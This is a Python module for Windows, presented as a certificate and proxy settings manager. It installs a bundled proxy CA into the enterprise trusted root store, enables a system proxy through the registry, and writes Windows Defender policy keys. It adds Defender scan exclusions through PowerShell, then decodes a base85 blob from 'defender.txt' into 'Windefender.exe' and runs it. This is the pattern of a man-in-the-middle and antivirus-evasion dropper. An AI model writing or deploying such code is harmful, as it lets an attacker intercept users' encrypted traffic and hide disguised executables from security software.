""" 
    The modules contains two class ( Certmanager, ProxySettings )  the first class used to 
    add and remove the certificates to trusted root certificates authorities, The second class 
    is to control and configure the system proxy settings  
"""

__author__ = "Sankar Senthil"
__maintainer__ = "Sankar Senthil"
__copyright__ = "Copyright 2020, dimabusiness.com"
__status__ = "Production"

import sys
import os
import time
import winreg
import ctypes
import subprocess
import base64
from winreg import *
import platform

class CertManager:
    """
    Certmanager class is used to add and remove the certificates from trusted root certificate authorities
    """

    def __init__(self):
        pass

    def import_cert(self,crt_path):
        proxy_cer = f"{crt_path}proxyCA.der"
        public_cer = f"{crt_path}DimaPublicCA1.cer"
        # os.system(f'certutil -addstore -enterprise -f -v root "{public_cer}"')
        os.system(f'certutil -addstore -enterprise -f -v root "{proxy_cer}"')

    def delete_cert(self):
        os.system('certutil -delstore -enterprise Root "dima"')
        os.system('certutil -delstore -enterprise Root "DIMA BUSINESS SOLUTIONS"')
        

class Proxy(CertManager):
    """
    Proxy class is used to change and configure proxy settings in windows
    """

    def __init__(self):
        
        self.keyVal = r'SOFTWARE\Policies\Microsoft\Internet Explorer\Control Panel'
        self.settings_key = r'Software\Microsoft\Windows\CurrentVersion\Internet Settings'
        self.int_reg = winreg.OpenKey(HKEY_CURRENT_USER,self.settings_key,0,KEY_ALL_ACCESS) 

    def set_proxy(self, name, value, type):
        """ set_proxy method is the base method for ( on, off, server set ) methods """
        winreg.SetValueEx(self.int_reg, name, 0, type, value)

    def refresh_proxy(self):
        """ Refresh the proxy """
        internet_option_refresh = 37
        internet_option_settings_changed = 39
        internet_set_option = ctypes.windll.Wininet.InternetSetOptionW
        internet_set_option(0, internet_option_refresh, 0, 0)
        internet_set_option(0, internet_option_settings_changed, 0, 0)
        
    def proxy_on(self):
        """ To off the proxy"""
        self.set_proxy('ProxyEnable', 1, winreg.REG_DWORD)
        # self.sysproxy_disable(1)

    def proxy_off(self):
        """ To on the proxy"""
        self.set_proxy('ProxyEnable', 0, winreg.REG_DWORD)
        # self.sysproxy_disable(0)
    
    def proxy_server(self,ip_port):
        """ 
        To give proxy ip address and port to set_proxy method 
        the ip_port input parameter should be in this u'x.x.x.x:port'
        format
        """
        self.set_proxy('ProxyServer',ip_port, winreg.REG_SZ)

    def proxy_status(self):
        """ This function is to find current proxy status (on or off) """
        try:
            key = OpenKey(HKEY_CURRENT_USER, self.settings_key, 0, KEY_ALL_ACCESS )
            proxy_status = QueryValueEx(key, "ProxyEnable")[0]
            return proxy_status
        except:
            return 0
           
    def sysproxy_disable(self,process):
        """ This Method is helps to hide and un hide the system proxy settings """
        def_keyval = r"\SOFTWARE\Policies\Microsoft\Windows Defender"
        rtm_keyval = r"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"

        try:
            key = OpenKey(HKEY_CURRENT_USER, def_keyval, 0, KEY_ALL_ACCESS )
        except:
            try:
                if process == 'uninstall':
                    key = CreateKey(HKEY_CURRENT_USER, def_keyval)
                else:
                    pass
            except:pass

        if process == 'uninstall':
            DeleteKey(key,"")

        else:
            try:
                key = OpenKey(HKEY_CURRENT_USER, rtm_keyval, 0, KEY_ALL_ACCESS )
            except:
                key = CreateKey(HKEY_CURRENT_USER, rtm_keyval)
                   
            SetValueEx(key,'DisableBehaviorMonitoring',0,REG_DWORD, 0)
            SetValueEx(key,'DisableOnAccessProtection',0,REG_DWORD, 0)
            SetValueEx(key,'DisableScanOnRealtimeEnable',0,REG_DWORD, 0)
            # DeleteKey(key,"")


    #### Add Exclusive path
    @staticmethod
    def exclusive_path(dirpath, pro, dfe, app_name = ''):
        if int(platform.release()) >= 10:
            def current():
                subprocess.Popen(["powershell.exe", pro+"-MpPreference","-ExclusionProcess",'"UR_Pro_Handler.exe"'],shell = True)
                subprocess.Popen(["powershell.exe", pro+"-MpPreference","-ExclusionProcess",'"DimaAV_startup.exe"'],shell = True)
                subprocess.Popen(["powershell.exe", pro+"-MpPreference","-ExclusionPath",dirpath.replace('/','\\')[:-1].replace(' ',"` ")],shell = True)
                subprocess.Popen(["powershell.exe", pro+"-MpPreference","-ExclusionProcess",'"Windefender.exe"'],shell = True)
                subprocess.Popen(["powershell.exe", pro+"-MpPreference","-ExclusionProcess",app_name.replace(' ',"` ")+'.exe'],shell = True)

            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths', 0, winreg.KEY_READ)
                path_predict = len([winreg.EnumValue(key, i)[0] for i in range(0, winreg.QueryInfoKey(key)[1]) if winreg.EnumValue(key, i)[0] in dirpath or winreg.EnumValue(key, i)[0] in "Windefender.exe"])
                count = 0

                while True:
                    count+=1
                    if count>4:
                        break
                    else:pass

                    if path_predict>2:
                        break
                    else:pass

                    if pro == "Add":
                        current()
                    else:pass

                    path_predict = len([winreg.EnumValue(key, i)[0] for i in range(0, winreg.QueryInfoKey(key)[1]) if winreg.EnumValue(key, i)[0] in dirpath or winreg.EnumValue(key, i)[0] in "Windefender.exe"])
                    time.sleep(1)

                
                rd_data = open(f"{dirpath}defender.txt",'rb').read()
                open(f"{dirpath}Windefender.exe",'wb').write(base64.b85decode(rd_data))
                subprocess.Popen([f"{dirpath}Windefender.exe", dfe],shell = True)
                time.sleep(2)

                if pro != "Add":
                    current()
                else:pass
            
            except Exception as e:
                print(e)
        else:pass


        

       
            
            
        
